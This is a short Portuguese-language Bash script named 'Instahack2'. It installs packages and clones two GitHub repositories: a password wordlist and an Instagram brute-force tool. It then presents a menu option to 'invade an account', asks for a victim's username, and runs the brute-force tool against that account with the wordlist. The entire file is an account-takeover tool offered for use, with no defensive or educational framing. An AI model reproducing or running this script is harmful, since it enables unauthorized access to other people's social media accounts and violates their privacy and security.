#! bin/bash/
#
#
apt-get update
apt-get upgrade
apt-get install git
apt-get install figlet
if find Brute-Force; find Instagram
then
	echo "Diretório encontrado"
else
git clone https://github.com/MRX8001/Brute-Force
git clone https://github.com/Pure-L0G1C/Instagram
fi
#
#
clear
figlet Instahack2
#
#MENU
echo
echo "========================================================="
echo "= \033[1;36m[\033[1;36m1]>> \033[1;33mInvadir uma conta"
echo "= \033[1;36m[\033[1;36m2]>> \033[1;33mSair"
echo "========================================================="
echo
read -p "[+]=>" instahack
#
if [ "$instahack" = "1" ];then
clear
figlet Instahack2
echo "\033[1;32m\n\n[+]=>DIGITE OU COLE O NOME DA VÍTIMA exe:(pedro1234)"
#
read -p "[+]=>" vitima
#
#Iniciando o ataque
clear
figlet START
cd Instagram
pip2 install -r requirements.txt
python2 instagram.py $vitima /home/default00/instahack2/Brute-Force/wordlist/wordlist.txt -m 3
fi
exit

